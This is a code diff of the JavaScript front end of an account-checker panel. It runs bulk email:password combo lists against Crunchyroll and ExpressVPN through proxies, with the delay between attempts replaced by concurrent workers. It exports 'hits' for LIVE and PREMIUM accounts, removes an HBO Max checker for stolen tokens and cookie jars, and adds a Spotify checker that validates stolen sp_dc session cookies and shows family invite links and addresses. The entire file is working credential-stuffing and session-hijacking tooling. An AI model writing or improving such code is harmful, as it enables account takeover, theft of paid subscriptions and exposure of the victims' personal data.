   outEl.innerHTML = ''; progressEl.style.display = 'block'; barEl.style.width = '0%';
   let done = 0, live = 0, bad = 0, free = 0, errors = 0;
   const total = lines.length;
+  const startTime = Date.now();
+  let currentIndex = 0;
+  const concurrency = 3;
 
-  for (const combo of lines) {
-    if (crBulkAbort) break;
-    const [email, ...pwParts] = combo.split(' | ')[0].trim().split(':');
-    const password = pwParts.join(':');
-    let retries = 0, success = false;
-    while (retries < 3 && !success) {
-      try {
-        const res = await fetch('/api/crunchyroll/check', {
-          method: 'POST',
-          headers: getAuthHeaders({ 'Content-Type': 'application/json' }),
-          body: JSON.stringify({ email: email.trim(), password: password.trim(), use_proxy: useProxy })
-        });
-        if (res.status === 401) { outEl.innerHTML += `<div style="padding:10px; color:#f43f5e; font-weight:600;">🔒 PIN tidak valid</div>`; crBulkAbort = true; break; }
-        if (res.status === 429) { retries++; await new Promise(r => setTimeout(r, 3000 * retries)); continue; }
-        const data = await res.json(); data.combo = combo; crBulkResults.push(data);
-        success = true;
-        if (data.status === 'LIVE') live++;
-        else if (data.status === 'BAD' || data.status === 'DEAD') bad++;
-        else if (data.status === 'FREE') free++;
-        else errors++;
-        outEl.innerHTML += renderCrResult({ ...data, email: email.trim(), _password: password.trim(), combo: combo.split(' | ')[0].trim() }, 'bulk');
-        outEl.scrollTop = outEl.scrollHeight;
-        updateCrStats(data.status);
-        if (data.status === 'LIVE') playAlert('live');
-        else if (data.status === 'FREE') playAlert('hold');
-      } catch(e) {
-        retries++;
-        if (retries >= 3) { errors++; outEl.innerHTML += `<div style="padding:6px; font-size:11px; color:#f59e0b;">⚠️ ${email}: ${e.message}</div>`; success = true; }
-        else { await new Promise(r => setTimeout(r, 2000)); }
+  async function worker() {
+    while (currentIndex < lines.length && !crBulkAbort) {
+      const idx = currentIndex++;
+      const combo = lines[idx];
+      const [email, ...pwParts] = combo.split(' | ')[0].trim().split(':');
+      const password = pwParts.join(':');
+      let retries = 0, success = false;
+      while (retries < 3 && !success) {
+        try {
+          const res = await fetch('/api/crunchyroll/check', {
+            method: 'POST',
+            headers: getAuthHeaders({ 'Content-Type': 'application/json' }),
+            body: JSON.stringify({ email: email.trim(), password: password.trim(), use_proxy: useProxy })
+          });
+          if (res.status === 401) { outEl.innerHTML += `<div style="padding:10px; color:#f43f5e; font-weight:600;">🔒 PIN tidak valid</div>`; crBulkAbort = true; break; }
+          if (res.status === 429) { retries++; await new Promise(r => setTimeout(r, 3000 * retries)); continue; }
+          const data = await res.json(); data.combo = combo; crBulkResults.push(data);
+          success = true;
+          if (data.status === 'LIVE') live++;
+          else if (data.status === 'BAD' || data.status === 'DEAD') bad++;
+          else if (data.status === 'FREE') free++;
+          else errors++;
+          outEl.innerHTML += renderCrResult({ ...data, email: email.trim(), _password: password.trim(), combo: combo.split(' | ')[0].trim() }, 'bulk');
+          outEl.scrollTop = outEl.scrollHeight;
+          updateCrStats(data.status);
+          if (data.status === 'LIVE') playAlert('live');
+          else if (data.status === 'FREE') playAlert('hold');
+        } catch(e) {
+          retries++;
+          if (retries >= 3) { errors++; outEl.innerHTML += `<div style="padding:6px; font-size:11px; color:#f59e0b;">⚠️ ${email}: ${e.message}</div>`; success = true; }
+          else { await new Promise(r => setTimeout(r, 2000)); }
+        }
       }
+      done++;
+      barEl.style.width = `${(done / total * 100).toFixed(1)}%`;
+      const elapsed = (Date.now() - startTime) / 1000;
+      const speed = done / elapsed;
+      const eta = Math.ceil((total - done) / speed);
+      statsEl.innerHTML = `<span style="color:#10b981;">${live} LIVE</span> · <span style="color:#38bdf8;">${free} FREE</span> · <span style="color:#f43f5e;">${bad} BAD</span> · <span style="color:#f59e0b;">${errors} ERR</span> · ${done}/${total} · ${speed.toFixed(1)}/s · ETA: ${eta}s`;
     }
-    await new Promise(r => setTimeout(r, 1200));
-    done++;
-    barEl.style.width = `${(done / total * 100).toFixed(1)}%`;
-    statsEl.innerHTML = `<span style="color:#10b981;">${live} LIVE</span> · <span style="color:#38bdf8;">${free} FREE</span> · <span style="color:#f43f5e;">${bad} BAD</span> · <span style="color:#f59e0b;">${errors} ERR</span> · ${done}/${total}`;
   }
+
+  const workers = Array.from({ length: Math.min(concurrency, lines.length) }, () => worker());
+  await Promise.all(workers);
   crBulkRunning = false;
   if (crBulkAbort) statsEl.innerHTML += ' · <span style="color:#f59e0b;">STOPPED</span>';
   else statsEl.innerHTML += ' · <span style="color:#10b981;">DONE</span>';
@@ -3203,6 +3184,13 @@ function exportCrHits() {
   const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
   a.download = `crunchyroll_hits_${new Date().toISOString().slice(0,10)}.txt`;
   a.click(); showToast(`${hits.length} hits exported`);
+}
+
+function copyCrHits() {
+  const hits = crBulkResults.filter(r => r.status === 'LIVE');
+  if (!hits.length) return showToast('Belum ada hits untuk dicopy');
+  const text = hits.map(h => `${h.combo} | Sub: ${h.subscription || 'N/A'} | Country: ${h.country || 'N/A'} | Profiles: ${h.profiles || 'N/A'}`).join('\n');
+  navigator.clipboard.writeText(text).then(() => showToast(`${hits.length} hits copied to clipboard`));
 }
 
 document.getElementById('cr-password')?.addEventListener('keydown', e => {
@@ -3490,45 +3478,56 @@ async function runEvpnBulk() {
   outEl.innerHTML = ''; progressEl.style.display = 'block'; barEl.style.width = '0%';
   let done = 0, premium = 0, trial = 0, free = 0, bad = 0, errors = 0;
   const total = lines.length;
+  const startTime = Date.now();
+  let currentIndex = 0;
+  const concurrency = 3;
 
-  for (const combo of lines) {
-    if (evpnBulkAbort) break;
-    const [email, ...pwParts] = combo.split(' | ')[0].trim().split(':');
-    const password = pwParts.join(':');
-    let retries = 0, success = false;
-    while (retries < 3 && !success) {
-      try {
-        const res = await fetch('/api/expressvpn/check', {
-          method: 'POST',
-          headers: getAuthHeaders({ 'Content-Type': 'application/json' }),
-          body: JSON.stringify({ email: email.trim(), password: password.trim(), use_proxy: useProxy })
-        });
-        if (res.status === 401) { outEl.innerHTML += `<div style="padding:10px; color:#f43f5e; font-weight:600;">🔒 PIN tidak valid</div>`; evpnBulkAbort = true; break; }
-        if (res.status === 429) { retries++; await new Promise(r => setTimeout(r, 3000 * retries)); continue; }
-        const data = await res.json(); data.combo = combo; evpnBulkResults.push(data);
-        success = true;
-        if (data.status === 'PREMIUM') premium++;
-        else if (data.status === 'TRIAL') trial++;
-        else if (data.status === 'FREE') free++;
-        else if (data.status === 'BAD' || data.status === 'DEAD') bad++;
-        else errors++;
-        outEl.innerHTML += renderEvpnResult({ ...data, email: email.trim(), _password: password.trim(), combo: combo.split(' | ')[0].trim() }, 'bulk');
-        outEl.scrollTop = outEl.scrollHeight;
-        updateEvpnStats(data.status);
-        if (data.status === 'PREMIUM') playAlert('4k');
-        else if (data.status === 'TRIAL') playAlert('live');
-        else if (data.status === 'FREE') playAlert('hold');
-      } catch(e) {
-        retries++;
-        if (retries >= 3) { errors++; outEl.innerHTML += `<div style="padding:6px; font-size:11px; color:#f59e0b;">⚠️ ${email}: ${e.message}</div>`; success = true; }
-        else { await new Promise(r => setTimeout(r, 2000)); }
+  async function worker() {
+    while (currentIndex < lines.length && !evpnBulkAbort) {
+      const idx = currentIndex++;
+      const combo = lines[idx];
+      const [email, ...pwParts] = combo.split(' | ')[0].trim().split(':');
+      const password = pwParts.join(':');
+      let retries = 0, success = false;
+      while (retries < 3 && !success) {
+        try {
+          const res = await fetch('/api/expressvpn/check', {
+            method: 'POST',
+            headers: getAuthHeaders({ 'Content-Type': 'application/json' }),
+            body: JSON.stringify({ email: email.trim(), password: password.trim(), use_proxy: useProxy })
+          });
+          if (res.status === 401) { outEl.innerHTML += `<div style="padding:10px; color:#f43f5e; font-weight:600;">🔒 PIN tidak valid</div>`; evpnBulkAbort = true; break; }
+          if (res.status === 429) { retries++; await new Promise(r => setTimeout(r, 3000 * retries)); continue; }
+          const data = await res.json(); data.combo = combo; evpnBulkResults.push(data);
+          success = true;
+          if (data.status === 'PREMIUM') premium++;
+          else if (data.status === 'TRIAL') trial++;
+          else if (data.status === 'FREE') free++;
+          else if (data.status === 'BAD' || data.status === 'DEAD') bad++;
+          else errors++;
+          outEl.innerHTML += renderEvpnResult({ ...data, email: email.trim(), _password: password.trim(), combo: combo.split(' | ')[0].trim() }, 'bulk');
+          outEl.scrollTop = outEl.scrollHeight;
+          updateEvpnStats(data.status);
+          if (data.status === 'PREMIUM') playAlert('4k');
+          else if (data.status === 'TRIAL') playAlert('live');
+          else if (data.status === 'FREE') playAlert('hold');
+        } catch(e) {
+          retries++;
+          if (retries >= 3) { errors++; outEl.innerHTML += `<div style="padding:6px; font-size:11px; color:#f59e0b;">⚠️ ${email}: ${e.message}</div>`; success = true; }
+          else { await new Promise(r => setTimeout(r, 2000)); }
+        }
       }
+      done++;
+      barEl.style.width = `${(done / total * 100).toFixed(1)}%`;
+      const elapsed = (Date.now() - startTime) / 1000;
+      const speed = done / elapsed;
+      const eta = Math.ceil((total - done) / speed);
+      statsEl.innerHTML = `<span style="color:#10b981;">${premium} PREMIUM</span> · <span style="color:#a855f7;">${trial} TRIAL</span> · <span style="color:#38bdf8;">${free} FREE</span> · <span style="color:#f43f5e;">${bad} BAD</span> · <span style="color:#f59e0b;">${errors} ERR</span> · ${done}/${total} · ${speed.toFixed(1)}/s · ETA: ${eta}s`;
     }
-    await new Promise(r => setTimeout(r, 1200));
-    done++;
-    barEl.style.width = `${(done / total * 100).toFixed(1)}%`;
-    statsEl.innerHTML = `<span style="color:#10b981;">${premium} PREMIUM</span> · <span style="color:#a855f7;">${trial} TRIAL</span> · <span style="color:#38bdf8;">${free} FREE</span> · <span style="color:#f43f5e;">${bad} BAD</span> · <span style="color:#f59e0b;">${errors} ERR</span> · ${done}/${total}`;
   }
+
+  const workers = Array.from({ length: Math.min(concurrency, lines.length) }, () => worker());
+  await Promise.all(workers);
   evpnBulkRunning = false;
   if (evpnBulkAbort) statsEl.innerHTML += ' · <span style="color:#f59e0b;">STOPPED</span>';
   else statsEl.innerHTML += ' · <span style="color:#10b981;">DONE</span>';
@@ -3546,130 +3545,53 @@ function exportEvpnHits() {
   a.click(); showToast(`${hits.length} hits exported`);
 }
 
+function copyEvpnHits() {
+  const hits = evpnBulkResults.filter(r => r.status === 'PREMIUM' || r.status === 'TRIAL');
+  if (!hits.length) return showToast('Belum ada hits untuk dicopy');
+  const text = hits.map(h => `${h.combo || h.email+':***'} | Status: ${h.status} | Plan: ${h.plan || 'N/A'} | Expire: ${h.expire_date || 'N/A'} | Days: ${h.days_left ?? 'N/A'}`).join('\n');
+  navigator.clipboard.writeText(text).then(() => showToast(`${hits.length} hits copied to clipboard`));
+}
+
 document.getElementById('evpn-password')?.addEventListener('keydown', e => {
   if (e.key === 'Enter') runEvpnSingle();
 });
 
 // ═══════════════════════════════════════════════════════════════════
-// HBO Max Account Checker Functions
-let hboCurrentMode = 'credentials';
-
-function switchHboMode(mode) {
-  hboCurrentMode = mode;
-  const credPanel = document.getElementById('hbo-cred-panel');
-  const tokenPanel = document.getElementById('hbo-token-panel');
-  const credBtn = document.getElementById('hbo-mode-cred');
-  const tokenBtn = document.getElementById('hbo-mode-token');
-
-  if (mode === 'token') {
-    credPanel.style.display = 'none';
-    tokenPanel.style.display = 'block';
-    credBtn.classList.remove('active');
-    tokenBtn.classList.add('active');
-    tokenBtn.style.background = 'var(--primary)';
-    tokenBtn.style.color = '#fff';
-    tokenBtn.style.borderColor = 'var(--primary)';
-    credBtn.style.background = '';
-    credBtn.style.color = '';
-    credBtn.style.borderColor = '';
-  } else {
-    credPanel.style.display = 'block';
-    tokenPanel.style.display = 'none';
-    tokenBtn.classList.remove('active');
-    credBtn.classList.add('active');
-    credBtn.style.background = 'var(--primary)';
-    credBtn.style.color = '#fff';
-    credBtn.style.borderColor = 'var(--primary)';
-    tokenBtn.style.background = '';
-    tokenBtn.style.color = '';
-    tokenBtn.style.borderColor = '';
-  }
-}
-
-// Auto-detect token format
-document.addEventListener('DOMContentLoaded', () => {
-  const tokenInput = document.getElementById('hbo-token-input');
-  if (tokenInput) {
-    tokenInput.addEventListener('input', () => {
-      const badge = document.getElementById('hbo-token-format-badge');
-      const val = tokenInput.value.trim();
-      if (!val) { badge.textContent = 'Format: Belum ada input'; return; }
-      if (val.startsWith('eyJ') && val.split('.').length === 3) {
-        badge.innerHTML = '<span style="color:#10b981;">✓ JWT Access Token</span>';
-      } else if (val.includes('access_token=') || val.includes('refresh_token=')) {
-        badge.innerHTML = '<span style="color:#38bdf8;">✓ Key=Value pairs</span>';
-      } else if (val.includes('\t') && (val.includes('.hbomax.com') || val.includes('hbomax.com'))) {
-        badge.innerHTML = '<span style="color:#b01bef;">✓ Netscape Cookie Jar (HBO Max)</span>';
-      } else if (val.length > 20) {
-        badge.innerHTML = '<span style="color:#f59e0b;">⚡ Refresh Token (akan di-exchange)</span>';
-      } else {
-        badge.innerHTML = '<span style="color:var(--text-dim);">? Format tidak dikenali</span>';
-      }
-    });
-  }
-});
-
-async function runHboTokenSingle() {
-  const token = document.getElementById('hbo-token-input').value.trim();
-  if (!token) return showToast('Paste token / cookie dulu');
-  const btn = document.getElementById('hbo-token-btn');
-  const btnText = document.getElementById('hbo-token-btn-text');
-  const outEl = document.getElementById('hbo-token-out');
-  const useProxy = document.getElementById('hbo-token-proxy-toggle')?.checked ?? false;
-  btn.disabled = true;
-  btnText.textContent = 'Checking...';
-  outEl.style.display = 'none';
-  outEl.className = 'card-out';
-  outEl.innerHTML = '';
-
-  try {
-    const res = await fetch('/api/hbomax/token', {
-      method: 'POST',
-      headers: getAuthHeaders({ 'Content-Type': 'application/json' }),
-      body: JSON.stringify({ token, use_proxy: useProxy })
-    });
-    const data = await res.json();
-    outEl.innerHTML = renderHboResult({ ...data, mode: 'token' }, 'single');
-    outEl.style.display = 'block';
-    updateHboStats(data.status);
-    if (data.status === 'LIVE') playAlert('live');
-    else if (data.status === 'HOLD') playAlert('hold');
-  } catch(e) {
-    outEl.className = 'card-out dead';
-    outEl.innerHTML = `
-      <div class="card-header-status" style="color:var(--dead);">
-        <span>✕</span> <span>Request Gagal</span>
-      </div>
-      <div style="color:var(--text-muted);">${e.message}</div>
-    `;
-    outEl.style.display = 'block';
-  }
-  btn.disabled = false;
-  btnText.textContent = 'Check HBO Max Token';
-}
+// Spotify Cookie Checker Functions
 // ═══════════════════════════════════════════════════════════════════
 
-let hboBulkRunning = false;
-let hboBulkAbort = false;
-let hboBulkResults = [];
+let spotifyBulkRunning = false;
+let spotifyBulkAbort = false;
+let spotifyBulkResults = [];
 
-const hboStats = { live: 0, hold: 0, bad: 0, error: 0 };
+const spotifyStats = { live: 0, free: 0, dead: 0, error: 0 };
 
-function renderHboResult(data, mode = 'single') {
+function renderSpotifyResult(data, mode = 'single') {
   const statusMap = {
-    LIVE: ['✅','#10b981','rgba(16,185,129,0.1)'],
-    HOLD: ['⏸','#f59e0b','rgba(245,158,11,0.1)'],
-    DEAD: ['💀','#f43f5e','rgba(244,63,94,0.1)'],
-    BAD: ['❌','#f43f5e','rgba(244,63,94,0.1)'],
+    LIVE: ['✅','#1DB954','rgba(29,185,84,0.1)'],
+    FREE: ['🆓','#38bdf8','rgba(56,189,248,0.1)'],
+    DEAD: ['❌','#f43f5e','rgba(244,63,94,0.1)'],
     ERROR: ['⚠️','#f59e0b','rgba(245,158,11,0.1)']
   };
   const [icon, color, bg] = statusMap[data.status] || ['❓','var(--text-muted)','rgba(132,139,159,0.1)'];
-  const comboText = data.combo || `${data.email || ''}:${data._password || '***'}`;
 
-  if (data.status === 'LIVE' || data.status === 'HOLD') {
-    const isHold = data.status === 'HOLD';
-    const cardClass = isHold ? 'card-out hold' : 'card-out live';
-    const label = isHold ? 'Account On Hold' : 'Account Live';
+  if (data.status === 'LIVE' || data.status === 'FREE') {
+    const label = data.status === 'LIVE' ? `${data.plan || 'Premium'} Account` : 'Free Account';
+    const cardClass = 'card-out live';
+
+    let familyInfo = '';
+    if (data.family_members > 0 || data.free_slots != null) {
+      familyInfo = `
+        <div class="meta-box"><span>Family Members</span><strong>${data.family_members || 0}${data.family_max_capacity ? '/' + data.family_max_capacity : ''}</strong></div>
+        <div class="meta-box"><span>Free Slots</span><strong style="color:${(data.free_slots || 0) > 0 ? '#1DB954' : 'var(--dead)'};">${data.free_slots != null ? data.free_slots : 'N/A'}</strong></div>
+      `;
+    }
+    if (data.invite_link) {
+      familyInfo += `<div class="meta-box" style="grid-column:1/-1;"><span>Invite Link</span><strong style="font-size:11px; word-break:break-all;"><a href="${data.invite_link}" target="_blank" style="color:#1DB954; text-decoration:none;">${data.invite_link}</a></strong></div>`;
+    }
+    if (data.address) {
+      familyInfo += `<div class="meta-box"><span>Address</span><strong style="font-size:11px;">${data.address}</strong></div>`;
+    }
 
     return `<div class="${mode === 'bulk' ? '' : cardClass}" style="${mode === 'bulk' ? `padding:16px; border-left:4px solid ${color}; background:${bg}; margin-bottom:10px; border-radius:var(--radius-lg);` : ''}">
       <div class="card-header-status" style="color:${color};">
@@ -3677,54 +3599,78 @@ function renderHboResult(data, mode = 'single') {
         <span style="margin-left:auto; font-size:11px; color:var(--text-muted); font-weight:500;">via ${data.route || 'Direct'}</span>
       </div>
 
-      ${isHold ? `
-      <div style="background:rgba(245, 158, 11, 0.12); border:1px solid rgba(245, 158, 11, 0.3); color:#fcd34d; padding:10px 14px; border-radius:var(--radius-sm); margin-bottom:12px; font-size:12px; display:flex; align-items:center; gap:8px;">
-        <span>⚠️</span> <span><strong>Subscription Inactive:</strong> Akun ini dalam status hold / lapsed.</span>
-      </div>
-      ` : ''}
-
       <div class="grid-meta">
         <div class="meta-box"><span>Email</span><strong>${data.email || 'N/A'}</strong></div>
-        <div class="meta-box"><span>Plan</span><strong style="color:#b01bef;">${data.plan || 'N/A'}</strong></div>
+        <div class="meta-box"><span>Plan</span><strong style="color:#1DB954;">${data.plan || 'N/A'}</strong></div>
         <div class="meta-box"><span>Country</span><strong>${data.country || 'N/A'}</strong></div>
-        <div class="meta-box"><span>Tier</span><strong>${data.tier || 'N/A'}</strong></div>
-        <div class="meta-box"><span>Token Expiry</span><strong>${data.token_expiry || 'N/A'}</strong></div>
-        <div class="meta-box"><span>Has Refresh Token</span><strong style="color:${data.has_refresh_token ? 'var(--live)' : 'var(--dead)'};">${data.has_refresh_token ? '✅ Yes' : '❌ No'}</strong></div>
-        ${data.mode === 'token' ? `
-        <div class="meta-box"><span>User ID</span><strong style="font-size:10px;">${data.user_id || 'N/A'}</strong></div>
-        <div class="meta-box"><span>Profile ID</span><strong style="font-size:10px;">${data.profile_id || 'N/A'}</strong></div>
-        <div class="meta-box"><span>Profiles</span><strong>${data.profiles || 'N/A'}</strong></div>
-        <div class="meta-box"><span>Service</span><strong>${data.service || 'N/A'}</strong></div>
-        <div class="meta-box"><span>Region</span><strong>${data.subdivision || 'N/A'}</strong></div>
-        <div class="meta-box"><span>Session Exp</span><strong>${data.session_expires || 'N/A'}</strong></div>
-        <div class="meta-box"><span>Format</span><strong style="color:var(--primary);">${(data.input_format || '').replace('_', ' ').toUpperCase() || 'N/A'}</strong></div>
-        ` : ''}
+        <div class="meta-box"><span>Next Payment</span><strong>${data.next_payment_date || 'N/A'}</strong></div>
+        <div class="meta-box"><span>Auto-Renew</span><strong style="color:${data.is_recurring ? 'var(--live)' : 'var(--text-muted)'};">${data.is_recurring === true ? '✅ Yes' : data.is_recurring === false ? '❌ No' : 'N/A'}</strong></div>
+        <div class="meta-box"><span>Role</span><strong>${data.is_owner === true ? '👑 Owner' : data.is_child_account ? '👤 Sub Account' : data.is_owner === false ? '👤 Member' : 'N/A'}</strong></div>
+        ${familyInfo}
       </div>
 
       <div style="display:flex; gap:8px; margin-top:14px; flex-wrap:wrap;">
-        <button class="btn-secondary" onclick="copyText('${escapeAttr(comboText)}', 'Combo disalin!')">📋 Copy Combo</button>
         <button class="btn-secondary" onclick="copyText('${escapeAttr(data.email || '')}', 'Email disalin!')">📧 Copy Email</button>
+        ${data.invite_link ? `<button class="btn-secondary" onclick="copyText('${escapeAttr(data.invite_link)}', 'Invite link disalin!')">🔗 Copy Invite</button>` : ''}
       </div>
     </div>`;
   }
 
-  // BAD / DEAD / ERROR
+  // DEAD / ERROR
   return `<div class="${mode === 'bulk' ? '' : 'card-out dead'}" style="${mode === 'bulk' ? `padding:10px; border-left:3px solid ${color}; background:${bg}; margin-bottom:6px; border-radius:var(--radius-sm);` : ''}">
     <div class="card-header-status" style="color:${color};">
-      <span>${icon}</span> <span>${data.status === 'BAD' ? 'Wrong Credentials' : data.status === 'DEAD' ? 'Token Expired / Dead' : data.status}</span>
+      <span>${icon}</span> <span>${data.status === 'DEAD' ? 'Dead / Expired Cookie' : data.status}</span>
     </div>
-    <div style="color:var(--text-muted); font-size:12px;">${data.reason || data.email || 'Akun tidak valid'}</div>
+    <div style="color:var(--text-muted); font-size:12px;">${data.reason || 'Cookie invalid or expired'}</div>
   </div>`;
 }
 
-async function runHboSingle() {
-  const email = document.getElementById('hbo-email').value.trim();
-  const password = document.getElementById('hbo-password').value.trim();
-  if (!email || !password) return showToast('Email dan password wajib diisi');
-  const btn = document.getElementById('hbo-single-btn');
-  const btnText = document.getElementById('hbo-single-btn-text');
-  const outEl = document.getElementById('hbo-single-out');
-  const useProxy = document.getElementById('hbo-proxy-toggle')?.checked ?? false;
+function updateSpotifyStats(status) {
+  if (status === 'LIVE') spotifyStats.live++;
+  else if (status === 'FREE') spotifyStats.free++;
+  else if (status === 'DEAD') spotifyStats.dead++;
+  else spotifyStats.error++;
+
+  const dashboard = document.getElementById('spotify-stats-dashboard');
+  if (dashboard) dashboard.style.display = 'block';
+
+  document.getElementById('spotify-stat-live').textContent = spotifyStats.live;
+  document.getElementById('spotify-stat-free').textContent = spotifyStats.free;
+  document.getElementById('spotify-stat-dead').textContent = spotifyStats.dead;
+  document.getElementById('spotify-stat-error').textContent = spotifyStats.error;
+
+  const total = spotifyStats.live + spotifyStats.free + spotifyStats.dead + spotifyStats.error;
+  document.getElementById('spotify-donut-total').textContent = total;
+
+  const hitRate = total > 0 ? ((spotifyStats.live) / total * 100) : 0;
+  document.getElementById('spotify-hit-rate').textContent = hitRate.toFixed(1) + '%';
+  document.getElementById('spotify-hit-rate-bar').style.width = hitRate + '%';
+
+  drawDonutChart('spotify-donut-chart', [
+    { val: spotifyStats.live,  color: '#1DB954' },
+    { val: spotifyStats.free,  color: '#38bdf8' },
+    { val: spotifyStats.dead,  color: '#f43f5e' },
+    { val: spotifyStats.error, color: '#f59e0b' },
+  ]);
+}
+
+function resetSpotifyStats() {
+  spotifyStats.live = 0; spotifyStats.free = 0; spotifyStats.dead = 0; spotifyStats.error = 0;
+  ['spotify-stat-live','spotify-stat-free','spotify-stat-dead','spotify-stat-error'].forEach(id => document.getElementById(id).textContent = '0');
+  document.getElementById('spotify-donut-total').textContent = '0';
+  document.getElementById('spotify-hit-rate').textContent = '0%';
+  document.getElementById('spotify-hit-rate-bar').style.width = '0%';
+  drawDonutChart('spotify-donut-chart', []);
+  showToast('Stats direset');
+}
+
+async function runSpotifySingle() {
+  const cookie = document.getElementById('spotify-cookie').value.trim();
+  if (!cookie) return showToast('Paste sp_dc cookie terlebih dahulu');
+  const btn = document.getElementById('spotify-single-btn');
+  const btnText = document.getElementById('spotify-single-btn-text');
+  const outEl = document.getElementById('spotify-single-out');
+  const useProxy = document.getElementById('spotify-proxy-toggle')?.checked ?? false;
   btn.disabled = true;
   btnText.textContent = 'Checking...';
   outEl.style.display = 'none';
@@ -3732,20 +3678,19 @@ async function runHboSingle() {
   outEl.innerHTML = '';
 
   try {
-    const res = await fetch('/api/hbomax/check', {
+    const res = await fetch('/api/spotify/check', {
       method: 'POST',
       headers: getAuthHeaders({ 'Content-Type': 'application/json' }),
-      body: JSON.stringify({ email, password, use_proxy: useProxy })
+      body: JSON.stringify({ cookie, use_proxy: useProxy })
     });
     const data = await res.json();
-    const mergedData = { ...data, _password: password, combo: `${email}:${password}` };
 
-    outEl.innerHTML = renderHboResult(mergedData, 'single');
+    outEl.innerHTML = renderSpotifyResult(data, 'single');
     outEl.style.display = 'block';
-    updateHboStats(data.status);
+    updateSpotifyStats(data.status);
 
     if (data.status === 'LIVE') playAlert('live');
-    else if (data.status === 'HOLD') playAlert('hold');
+    else if (data.status === 'FREE') playAlert('hold');
   } catch(e) {
     outEl.className = 'card-out dead';
     outEl.innerHTML = `
@@ -3757,245 +3702,195 @@ async function runHboSingle() {
     outEl.style.display = 'block';
   }
   btn.disabled = false;
-  btnText.textContent = 'Check HBO Max Account';
+  btnText.textContent = 'Check Spotify Account';
 }
 
-async function runHboBulk() {
-  if (hboBulkRunning) return;
+// ---- Spotify File Upload Handler ----
+let spotifyFileQueue = [];
 
-  // Determine mode and build job list
-  let jobs = []; // each: { type: 'combo'|'token', payload: {}, label: '...' }
+function handleSpotifyFiles(files) {
+  if (!files || !files.length) return;
+  const fileInfo = document.getElementById('spotify-file-info');
+  const textarea = document.getElementById('spotify-bulk-input');
+  spotifyFileQueue = [];
+  let processed = 0;
+  const total = files.length;
+  fileInfo.style.display = 'block';
+  fileInfo.textContent = `⏳ Memuat ${total} file...`;
 
-  if (hboBulkMode === 'files') {
-    // File upload mode — each file is a cookie/token check
-    if (!hboCookieFiles.length) return showToast('Upload cookie files dulu');
-    for (const f of hboCookieFiles) {
-      jobs.push({ type: 'token', payload: { token: f.content, use_proxy: document.getElementById('hbo-proxy-toggle')?.checked ?? false }, label: f.name });
-    }
-  } else {
-    // Combo mode — email:password lines
-    const raw = document.getElementById('hbo-bulk-input').value.trim();
-    if (!raw) return showToast('Paste combo list dulu');
-    const lines = raw.split('\n').map(l => l.trim()).filter(l => l && l.includes(':'));
-    if (!lines.length) return showToast('Tidak ada combo valid');
-    for (const combo of lines) {
-      const [email, ...pwParts] = combo.split(' | ')[0].trim().split(':');
-      const password = pwParts.join(':');
-      jobs.push({ type: 'combo', payload: { email: email.trim(), password: password.trim(), use_proxy: document.getElementById('hbo-proxy-toggle')?.checked ?? false }, label: combo.split(' | ')[0].trim() });
-    }
-  }
-
-  hboBulkRunning = true; hboBulkAbort = false; hboBulkResults = [];
-  const outEl = document.getElementById('hbo-bulk-out');
-  const statsEl = document.getElementById('hbo-bulk-stats');
-  const progressEl = document.getElementById('hbo-bulk-progress');
-  const barEl = document.getElementById('hbo-progress-bar');
-  outEl.innerHTML = ''; progressEl.style.display = 'block'; barEl.style.width = '0%';
-  let done = 0, live = 0, hold = 0, bad = 0, errors = 0;
-  const total = jobs.length;
-
-  for (const job of jobs) {
-    if (hboBulkAbort) break;
-
-    const endpoint = job.type === 'token' ? '/api/hbomax/token' : '/api/hbomax/check';
-    let retries = 0, success = false;
-
-    while (retries < 3 && !success) {
-      try {
-        const res = await fetch(endpoint, {
-          method: 'POST',
-          headers: getAuthHeaders({ 'Content-Type': 'application/json' }),
-          body: JSON.stringify(job.payload)
-        });
-        if (res.status === 401) { outEl.innerHTML += `<div style="padding:10px; color:#f43f5e; font-weight:600;">🔒 PIN tidak valid</div>`; hboBulkAbort = true; break; }
-        if (res.status === 429) { retries++; await new Promise(r => setTimeout(r, 3000 * retries)); continue; }
-        const data = await res.json();
-        data.combo = job.label;
-        hboBulkResults.push(data);
-        success = true;
-        if (data.status === 'LIVE') live++;
-        else if (data.status === 'HOLD') hold++;
-        else if (data.status === 'BAD' || data.status === 'DEAD') bad++;
-        else errors++;
-
-        const renderData = job.type === 'token'
-          ? { ...data, mode: 'token', combo: job.label }
-          : { ...data, email: job.payload.email, _password: job.payload.password, combo: job.label };
-        outEl.innerHTML += renderHboResult(renderData, 'bulk');
-        outEl.scrollTop = outEl.scrollHeight;
-        updateHboStats(data.status);
-        if (data.status === 'LIVE') playAlert('live');
-        else if (data.status === 'HOLD') playAlert('hold');
-      } catch(e) {
-        retries++;
-        if (retries >= 3) { errors++; outEl.innerHTML += `<div style="padding:6px; font-size:11px; color:#f59e0b;">⚠️ ${job.label}: ${e.message}</div>`; success = true; }
-        else { await new Promise(r => setTimeout(r, 2000)); }
-      }
-    }
-    await new Promise(r => setTimeout(r, 1200));
-    done++;
-    barEl.style.width = `${(done / total * 100).toFixed(1)}%`;
-    statsEl.innerHTML = `<span style="color:#10b981;">${live} LIVE</span> · <span style="color:#f59e0b;">${hold} HOLD</span> · <span style="color:#f43f5e;">${bad} BAD</span> · <span style="color:#94a3b8;">${errors} ERR</span> · ${done}/${total}`;
-  }
-  hboBulkRunning = false;
-  if (hboBulkAbort) statsEl.innerHTML += ' · <span style="color:#f59e0b;">STOPPED</span>';
-  else statsEl.innerHTML += ' · <span style="color:#10b981;">DONE</span>';
-}
-
-function stopHboBulk() { hboBulkAbort = true; }
-
-// Bulk mode switcher (combo vs file upload)
-let hboBulkMode = 'combo';
-let hboCookieFiles = []; // {name, content}
-
-function switchHboBulkMode(mode) {
-  hboBulkMode = mode;
-  const comboArea = document.getElementById('hbo-bulk-combo-area');
-  const filesArea = document.getElementById('hbo-bulk-files-area');
-  const comboBtn = document.getElementById('hbo-bulk-mode-combo');
-  const filesBtn = document.getElementById('hbo-bulk-mode-files');
-
-  if (mode === 'files') {
-    comboArea.style.display = 'none';
-    filesArea.style.display = 'block';
-    comboBtn.classList.remove('active');
-    filesBtn.classList.add('active');
-    filesBtn.style.background = 'var(--primary)';
-    filesBtn.style.color = '#fff';
-    filesBtn.style.borderColor = 'var(--primary)';
-    comboBtn.style.background = '';
-    comboBtn.style.color = '';
-    comboBtn.style.borderColor = '';
-  } else {
-    comboArea.style.display = 'block';
-    filesArea.style.display = 'none';
-    filesBtn.classList.remove('active');
-    comboBtn.classList.add('active');
-    comboBtn.style.background = 'var(--primary)';
-    comboBtn.style.color = '#fff';
